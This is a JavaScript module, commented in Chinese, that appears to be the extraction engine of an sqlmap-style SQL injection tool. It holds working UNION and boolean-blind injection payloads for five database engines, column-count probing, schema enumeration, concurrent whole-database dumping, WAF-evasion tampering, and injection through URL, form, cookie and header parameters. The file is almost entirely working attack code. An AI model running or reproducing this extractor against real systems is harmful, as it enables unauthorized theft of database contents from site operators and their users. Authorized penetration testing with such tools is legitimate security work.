import { URL } from 'url';
import { nullSequence, obfuscatePayload } from './payloads.js';
import { discoverEchoColumns, applyBoundary } from './injection.js';
import { obfuscateWithConfig } from '../core/tamper/applyTampers.js';

// 不同库对标记包裹的方式（UNION 提取标量时定位回显列）
export const WRAP = {
  MySQL: (s) => `CONCAT('__S__',CAST((${s}) AS CHAR),'__E__')`,
  PostgreSQL: (s) => `('__S__' || CAST((${s}) AS TEXT) || '__E__')`,
  SQLite: (s) => `('__S__' || (${s}) || '__E__')`,
  'SQL Server': (s) => `('__S__'+CAST((${s}) AS VARCHAR(MAX))+'__E__')`,
  Oracle: (s) => `('__S__' || TO_CHAR((${s})) || '__E__')`,
};

// 各库系统表查询模板（库/表/列/数据）
const SYS_QUERIES = {
  MySQL: {
    databases: 'SELECT GROUP_CONCAT(schema_name SEPARATOR \',\') FROM information_schema.schemata',
    tables: (db) =>
      `SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${db}'`,
    columns: (db, table) =>
      `SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='${db}' AND table_name='${table}'`,
    data: (db, table, cols, limit, offset = 0) =>
      `SELECT GROUP_CONCAT(CONCAT_WS('|', ${cols.join(',')})) FROM \`${db}\`.\`${table}\` LIMIT ${limit} OFFSET ${offset}`,
  },
  PostgreSQL: {
    databases: 'SELECT string_agg(datname, \',\') FROM pg_database',
    // PostgreSQL 的 table_schema 是 schema 名（如 public），不是 database 名；
    // 忽略传入的 database 名，固定查 public，避免把 database 名当 schema 导致查空。
    tables: () =>
      `SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public'`,
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${table}' AND table_schema='public'`,
    data: (db, table, cols, limit, offset = 0) =>
      `SELECT string_agg(CONCAT_WS('|', ${cols.join(',')}), '||') FROM "${table}" LIMIT ${limit} OFFSET ${offset}`,
  },
  SQLite: {
    databases: null,
    tables: () => "SELECT group_concat(name) FROM sqlite_master WHERE type='table'",
    columns: (db, table) => `SELECT group_concat(name) FROM pragma_table_info('${table}')`,
    // 注意：SQLite 没有 CONCAT_WS，必须用 || 拼接 + group_concat 自定义分隔符 '||'。
    // 行内各列用 " || '|' || " 连接；行间用 group_concat(..., '||') 连接，
    // 与 dumpData 的「split('||') 切行 / split('|') 切列」契约完全一致。
    data: (db, table, cols, limit, offset = 0) => {
      const rowExpr = `(${cols
        .map((c) => `COALESCE(CAST(${c} AS TEXT),'')`)
        .join(" || '|' || ")})`;
      return `SELECT group_concat(${rowExpr}, '||') FROM "${table}" LIMIT ${limit} OFFSET ${offset}`;
    },
  },
  'SQL Server': {
    databases: 'SELECT string_agg(name, \',\') FROM sys.databases',
    tables: () => 'SELECT string_agg(table_name, \',\') FROM information_schema.tables',
    columns: (db, table) =>
      `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${table}'`,
    data: (db, table, cols, limit, offset = 0) =>
      `SELECT string_agg(CONCAT('|', ${cols.join(',')}), '||') FROM [${table}] ORDER BY (SELECT NULL) OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
  },
  Oracle: {
    databases: null,
    tables: () =>
      'SELECT listagg(table_name, \',\') WITHIN GROUP (ORDER BY table_name) FROM user_tables',
    columns: (db, table) =>
      `SELECT listagg(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM user_tab_columns WHERE table_name='${table}'`,
    data: (db, table, cols, limit) =>
      `SELECT listagg(CONCAT('|', ${cols.join(',')}), '||') FROM "${table}" WHERE ROWNUM<=${limit}`,
  },
};

// 盲注二分提取所需的库函数映射
// MariaDB 与 MySQL 协议互通：指纹层已独立区分，但提取/枚举复用 MySQL 分支
function resolveDbms(dbms) {
  return dbms === 'MariaDB' ? 'MySQL' : (dbms || 'MySQL');
}

// 按关键字过滤名称列表（--search 对标 sqlmap：表名/列名关键字搜索，枚举后过滤）
// keyword 为空/假值 → 原样返回（不过滤）；否则大小写不敏感包含匹配。
export function filterBySearch(names, keyword) {
  if (!keyword) return names;
  const k = String(keyword).toLowerCase();
  return (names || []).filter((n) => String(n).toLowerCase().includes(k));
}

const LEN_FN = {
  MySQL: (e) => `LENGTH((${e}))`,
  PostgreSQL: (e) => `LENGTH((${e}))`,
  SQLite: (e) => `LENGTH((${e}))`,
  'SQL Server': (e) => `LEN((${e}))`,
  Oracle: (e) => `LENGTH((${e}))`,
};
const SUB_FN = {
  MySQL: (e, i) => `SUBSTRING((${e}),${i},1)`,
  PostgreSQL: (e, i) => `SUBSTRING((${e}) FROM ${i} FOR 1)`,
  SQLite: (e, i) => `SUBSTR((${e}),${i},1)`,
  'SQL Server': (e, i) => `SUBSTRING((${e}),${i},1)`,
  Oracle: (e, i) => `SUBSTR((${e}),${i},1)`,
};
const ASCII_FN = {
  MySQL: (c) => `ASCII(${c})`,
  PostgreSQL: (c) => `ASCII(${c})`,
  SQLite: (c) => `UNICODE(${c})`,
  'SQL Server': (c) => `ASCII(${c})`,
  Oracle: (c) => `ASCII(${c})`,
};
// 各库版本表达式（盲注提取证明用）
const VERSION_EXPR = {
  MySQL: 'version()',
  PostgreSQL: 'version()',
  SQLite: 'sqlite_version()',
  'SQL Server': '@@version',
  Oracle: "(SELECT banner FROM v$version WHERE rownum=1)",
};

// 数据提取器：基于确认的可回显注入点做库/表/列/数据枚举；
// 盲注场景退化为布尔/时间二分提取（受 config 约束）。
export class Extractor {
  constructor() {
    this.colTypeEnum = null;
  }

  // 注入列类型枚举器（由 ScanManager 设置）
  setColumnTypeEnumerator(instance) {
    this.colTypeEnum = instance;
  }

  // 构造带注入值的请求（按位置；支持表单点）
  _build(target, point, value) {
    // 表单点回退：优先用表单自身的提交方法与 action 地址；否则回退到 target 默认。
    const req = {
      method: point.formMethod || target.method,
      url: point.actionUrl || target.baseUrl,
      params: {},
      data: {},
      headers: { ...(target.headerParams || {}) },
    };
    const cookies = { ...(target.cookieParams || {}) };
    if (point.location === 'url') {
      const u = new URL(req.url);
      u.searchParams.set(point.param, value);
      req.url = u.toString();
    } else if (point.location === 'body') {
      // 表单点：将表单全部字段并入 data（含 CSRF token），再把当前注入参数覆盖为注入值
      const formValues = point.formValues || {};
      req.data = { ...formValues };
      req.data[point.param] = value;
    } else if (point.location === 'cookie') {
      cookies[point.param] = value;
      req.headers['Cookie'] = Object.entries(cookies)
        .map(([k, v]) => `${k}=${v}`)
        .join('; ');
    } else if (point.location === 'header') {
      req.headers[point.param] = value;
    }
    return req;
  }

  async _send(ctx, value, opts = {}) {
    const config = (ctx && ctx.config) || {};
    // WAF 混淆：统一走 obfuscateWithConfig（tamper 链式优先，否则 legacy obfuscate，否则原样）
    const v = applyBoundary(obfuscateWithConfig(value, ctx), ctx.point, config.injectionBoundary);
    const req = this._build(ctx.target, ctx.point, v);
    try {
      return await ctx.httpClient.request({
        method: req.method,
        url: req.url,
        params: req.params,
        data: req.data,
        headers: req.headers,
        timeoutMs: opts.timeoutMs ?? config.timeoutMs,
        retry: opts.retry ?? config.retry,
        proxy: config.proxy ?? false,
        auth: config.auth ?? null,
        wafEvasion: config.wafEvasion ?? null,
      });
    } catch {
      return null;
    }
  }

  // 猜列数（ORDER BY 二分探测，替代线性扫描：请求数 50→log2(50)≈6）
  async guessColumns(ctx) {
    const baseline = await this._send(ctx, ctx.point.originalValue || '1');
    const baseLen = String(baseline?.data ?? '').length;
    const maxCols = ctx.config?.maxColumnsGuess ?? 50;
    const orig = ctx.point.originalValue || '1';
    let lo = 1;
    let hi = maxCols;
    let ans = 0;
    while (lo <= hi) {
      const mid = Math.floor((lo + hi) / 2);
      const res = await this._send(ctx, `${orig} ORDER BY ${mid}-- -`);
      const len = String(res?.data ?? '').length;
      if (res?.status >= 500 || len < baseLen * 0.5) {
        hi = mid - 1;
      } else {
        ans = mid;
        lo = mid + 1;
      }
    }
    return ans <= 0 ? 1 : ans;
  }

  // 列数缓存：同一注入点生命周期内列数不变，缓存避免每次枚举重复 ORDER BY 二分探测
  async _guessColumnsCached(ctx) {
    if (ctx._guessedColumns == null) {
      ctx._guessedColumns = await this.guessColumns(ctx);
    }
    return ctx._guessedColumns;
  }

  // 通过 UNION 提取单个标量值（用标记包裹，返回标记间内容）
  async extractScalar(ctx, sql, columns) {
    const { point, dbms } = ctx;
    const nulls = nullSequence(columns).split(',');
    // 优先复用检测阶段已识别的回显列；未识别（如 error 型注入）则现场探测，
    // 不再硬编第 2 列，回显列非 2 也能正确拖库。
    let echoCols = point.echoCols;
    if (!echoCols || !echoCols.length) {
      echoCols = await discoverEchoColumns(ctx.httpClient, ctx, columns);
    }
    const idx = echoCols && echoCols.length ? echoCols[0] : 1;
    const cols = nulls
      .map((_, i) => (i === idx ? WRAP[resolveDbms(dbms)](sql) : 'NULL'))
      .join(',');
    const fromDual = dbms === 'Oracle' ? ' FROM dual' : '';
    const payload = `${point.originalValue || '1'} UNION SELECT ${cols}${fromDual}-- -`;
    const res = await this._send(ctx, payload);
    const body = String(res?.data ?? '');
    const m = body.match(/__S__(.*?)__E__/s);
    return m ? m[1] : null;
  }

  // 枚举数据库
  async enumerateDatabases(ctx) {
    const db = resolveDbms(ctx.dbms);
    const q = SYS_QUERIES[db]?.databases;
    if (q == null) return ctx.dbms === 'SQLite' ? ['main'] : [];
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, q, columns);
    return val ? val.split(',').filter(Boolean) : [];
  }

  // 枚举表
  async enumerateTables(ctx, db) {
    const edb = resolveDbms(ctx.dbms);
    const q = SYS_QUERIES[edb]?.tables(db);
    if (!q) return [];
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, q, columns);
    return val ? val.split(',').filter(Boolean) : [];
  }

  // 枚举列
  async enumerateColumns(ctx, db, table) {
    const edb = resolveDbms(ctx.dbms);
    const q = SYS_QUERIES[edb]?.columns(db, table);
    if (!q) return [];
    const columns = await this._guessColumnsCached(ctx);
    const val = await this.extractScalar(ctx, q, columns);
    return val ? val.split(',').filter(Boolean) : [];
  }

  // 提取数据（返回对象数组，键为列名）；MySQL/SQLite/PG/SQLServer 自动分页续拉到全量，Oracle 受 ROWNUM 单页限制
  async dumpData(ctx, db, table, cols, limit) {
    const lim = limit ?? ctx.config?.dumpRowLimit ?? 100;
    const edb = resolveDbms(ctx.dbms);
    const q0 = SYS_QUERIES[edb]?.data(db, table, cols || [], lim, 0);
    if (!q0) return [];
    const columns = await this._guessColumnsCached(ctx);
    // Oracle 用 ROWNUM 单页（模板忽略 offset）；其余库支持 LIMIT/OFFSET 分页续拉
    const PAGINATED = edb !== 'Oracle';
    const all = [];
    const maxRows = ctx.config?.dumpMaxRows ?? lim * 50; // 全量上限保护，防超大表无限拉取
    let offset = 0;
    while (true) {
      const q = PAGINATED
        ? SYS_QUERIES[edb].data(db, table, cols || [], lim, offset)
        : SYS_QUERIES[edb].data(db, table, cols || [], lim);
      const val = await this.extractScalar(ctx, q, columns);
      if (!val) break;
      const rowStrs = val.split('||').map((r) => r.trim()).filter(Boolean);
      for (const rowStr of rowStrs) {
        const cells = rowStr.split('|');
        const obj = {};
        (cols || []).forEach((c, i) => {
          obj[c] = cells[i] ?? null;
        });
        all.push(obj);
      }
      if (rowStrs.length < lim) break; // 本页不足一页 → 末页
      offset += lim;
      if (all.length >= maxRows) break; // 触达全量上限
    }
    return all;
  }

  // 并发多表拖库：同库内表级并发（受 dumpConcurrency 约束），单表失败不影响其他表
  async dumpDatabase(ctx, db, opts = {}) {
    const search = ctx.config?.search;
    let tables = await this.enumerateTables(ctx, db);
    // --search 表名过滤（枚举后过滤；空关键字不生效）
    if (search) tables = filterBySearch(tables, search);
    const concurrency = ctx.config?.dumpConcurrency || 4;
    const columns = {};
    const rows = {};
    const worker = async (table) => {
      let cols = await this.enumerateColumns(ctx, db, table);
      // --search 列名过滤（枚举后过滤）
      if (search) cols = filterBySearch(cols, search);
      if (!cols.length) return; // 无匹配列则跳过该表
      columns[table] = cols;
      try {
        rows[table] = await this.dumpData(ctx, db, table, cols);
      } catch (e) {
        // UNION 提取失败（WAF/列数限制）→ 堆叠深度提取兜底（需目标支持 stacked queries）
        if (opts.fallback) {
          opts.onFallback?.(table);
          rows[table] = await opts.fallback(ctx, db, table, cols, e);
        } else {
          throw e;
        }
      }
    };
    await this._concurrentMap(tables, worker, concurrency);
    return { tables, columns, rows };
  }

  // 跨库并发拖库：库级并发（受 dumpDatabaseConcurrency 约束），单库失败不影响其他库。
  // 返回聚合结构：{ databases, tables:{db:[t]}, columns:{'db.t':[c]}, rows:{'db.t':[obj]} }
  // columns/rows 已加 db. 前缀，与 ScanManager._extract 的取用方式对齐。
  async dumpAllDatabases(ctx, dbs, opts = {}) {
    const concurrency = ctx.config?.dumpDatabaseConcurrency || 2;
    const tables = {};
    const columns = {};
    const rows = {};
    const worker = async (db) => {
      const dumped = await this.dumpDatabase(ctx, db, opts);
      tables[db] = dumped.tables;
      for (const [t, cols] of Object.entries(dumped.columns)) {
        columns[`${db}.${t}`] = cols;
      }
      for (const [t, rws] of Object.entries(dumped.rows)) {
        rows[`${db}.${t}`] = rws;
      }
    };
    await this._concurrentMap(dbs, worker, concurrency);
    return { databases: dbs, tables, columns, rows };
  }

  // 通用并发映射：任务间顺序无关；单任务异常被吞，不中断其他任务（与 _sendBatch 一致容错）
  async _concurrentMap(items, fn, concurrency) {
    const queue = items.slice();
    let cursor = 0;
    const run = async () => {
      while (cursor < queue.length) {
        const i = cursor++;
        try {
          await fn(queue[i], i);
        } catch {
          /* 单表失败不影响其他表 */
        }
      }
    };
    const pool = Array.from({ length: Math.min(concurrency, queue.length) }, () => run());
    await Promise.all(pool);
  }

  // ===== 盲注二分提取（兜底） =====

  // 盲注二分提取单个表达式字符串：长度二分 + 多字符并行二分（并发度 extractConcurrency）
  async extractBoolean(ctx, expr) {
    const dbms = resolveDbms(ctx.dbms || 'MySQL');
    const base = ctx.point.originalValue || '1';
    const lenFn = LEN_FN[dbms] || LEN_FN.MySQL;
    const subFn = SUB_FN[dbms] || SUB_FN.MySQL;
    const asciiFn = ASCII_FN[dbms] || ASCII_FN.MySQL;

    const len = await this._binarySearch(ctx, base, (cmp) =>
      `(${lenFn(expr)})${cmp}`
    );
    if (len <= 0) return null;

    // 多字符并行二分：每轮并发探测 K 个位置，false 基准整批共用，提速约 K 倍
    const K = ctx.config?.extractConcurrency || 4;
    const out = new Array(len).fill('');
    const st = Array.from({ length: len }, (_, i) => ({ pos: i + 1, lo: 0, hi: 126 }));
    let remaining = st.slice(); // 未完成（未收敛）位置；每轮取前 K 个并发探测，未收敛的回插队尾
    while (remaining.length) {
      const batch = remaining.splice(0, K);
      const reqs = batch.map((s) => {
        const mid = Math.floor((s.lo + s.hi) / 2);
        s._mid = mid;
        return `${base} AND (${asciiFn(subFn(expr, s.pos))}>${mid})-- -`;
      });
      reqs.push(`${base} AND (1=2)-- -`); // 整批共用的 false 基准
      const resps = await this._sendBatch(ctx, reqs);
      const falseData = String(resps[resps.length - 1]?.data ?? '');
      for (let k = 0; k < batch.length; k++) {
        const s = batch[k];
        const trueData = String(resps[k]?.data ?? '');
        const ok = trueData !== falseData;
        if (ok) s.lo = s._mid + 1;
        else s.hi = s._mid - 1;
        if (s.lo > s.hi) {
          const code = s.hi + 1;
          out[s.pos - 1] = code >= 32 && code <= 126 ? String.fromCharCode(code) : '';
        } else {
          remaining.push(s); // 未收敛，回插队尾等待下一轮继续二分
        }
      }
    }
    return out.join('');
  }

  // 限并发发送一批注入值，保持顺序返回（单请求失败返回 null，不中断整体）
  async _sendBatch(ctx, values) {
    const K = ctx.config?.extractConcurrency || 4;
    const out = new Array(values.length);
    let cursor = 0;
    const worker = async () => {
      while (cursor < values.length) {
        const i = cursor++;
        out[i] = await this._send(ctx, values[i]);
      }
    };
    const n = Math.max(1, Math.min(K, values.length));
    await Promise.all(Array.from({ length: n }, () => worker()));
    return out;
  }

  // 通用二分：并发发「真条件 + false 基准」两请求，返回使条件成立的最大值（0..126）
  async _binarySearch(ctx, base, makeCond) {
    const test = async (cmp) => {
      const [rTrue, rFalse] = await this._sendBatch(ctx, [
        `${base} AND (${makeCond(cmp)})-- -`,
        `${base} AND (1=2)-- -`,
      ]);
      return String(rTrue?.data ?? '') !== String(rFalse?.data ?? '');
    };
    // 找上界
    let lo = 0;
    let hi = 126;
    let found = -1;
    while (lo <= hi) {
      const mid = Math.floor((lo + hi) / 2);
      const ok = await test(`>${mid}`);
      if (ok) {
        found = mid;
        lo = mid + 1;
      } else {
        hi = mid - 1;
      }
    }
    return found + 1;
  }

  // 盲注提取版本证明（供 ScanManager 在布尔/时间注入点调用）
  async extractProof(ctx) {
    const expr = VERSION_EXPR[resolveDbms(ctx.dbms)];
    if (!expr) return null;
    return this.extractBoolean(ctx, expr);
  }
}

export default Extractor;
